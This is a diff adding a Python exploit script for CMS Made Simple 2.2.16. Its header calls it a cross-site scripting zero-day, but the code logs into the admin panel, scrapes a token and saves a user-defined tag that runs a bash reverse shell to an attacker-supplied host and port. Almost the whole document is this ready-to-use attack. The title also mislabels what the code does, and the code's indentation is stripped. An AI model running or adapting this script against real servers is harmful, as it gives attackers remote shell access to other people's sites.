@@ -1,0 +1,48 @@
+# Exploit Title: CMS Made Simple 2.2.16 - 'm1_fmmessage' Cross-Site Scripting (XSS) Zero-Day
+# Date: 2022/04/11
+# Vendor Homepage: http://www.cmsmadesimple.org/
+# Software Link: https://s3.amazonaws.com/cmsms/downloads/14953/cmsms-2.2.16-install.zip
+# Version: 2.2.16
+# Cve: N/A
+
+from bs4 import BeautifulSoup
+from requests import Session
+from sys import argv
+import requests
+
+try:
+# Remote
+rhost = str(argv[1])
+rport = str(argv[2])
+username = str(argv[5])
+password = str(argv[6])
+
+# Local
+lhost = str(argv[3])
+lport = str(argv[4])
+
+logın_url = (f"http://{str(rhost)}:{str(rport)}/admin/login.php")
+
+with Session() as ses:
+url_get = ses.get(logın_url)
+logın_data = {"username":f"{username}","password":f"{password}","loginsubmit":"submit"}
+ses.post(logın_url, logın_data)
+admın_page = ses.get(f"http://{str(rhost)}:{str(rport)}/admin/index.php")
+bs_content = BeautifulSoup(admın_page.content, "html.parser")
+token_parse = bs_content.find("link", {"rel":"stylesheet"})["href"]
+token = token_parse[14:33]
+userDefinedTag_url = (f"http://{str(rhost)}:{str(rport)}/admin/editusertag.php?__c={token}&userplugin_id=2")
+userTag_get = ses.get(userDefinedTag_url)
+
+bs_description = BeautifulSoup(userTag_get.content, "html.parser")
+description = bs_description.find("input", {"name":"userplugin_name"})["value"]
+print("Done :)")
+exploıt_form = {"__c":f"{str(token)}","userplugin_id":"2","userplugin_name":str(description),"code":['exec("' + f"/bin/bash -c 'bash -i > /dev/tcp/{lhost}/{lport} 0>&1'"+'");','exec("' + f"/bin/bash -c 'bash -i > /dev/tcp/{lhost}/{lport} 0>&1'"+'");'],"description":"You are hacked :)","run":"1","apply":"1","ajax":"1"}
+
+exploıt_go = ses.post(userDefinedTag_url, exploıt_form)
+
+except IndexError:
+print("""
+Usage:
+python exploit.py <rhost> <rport> <lhost> <lport> <username> <password>
+""")
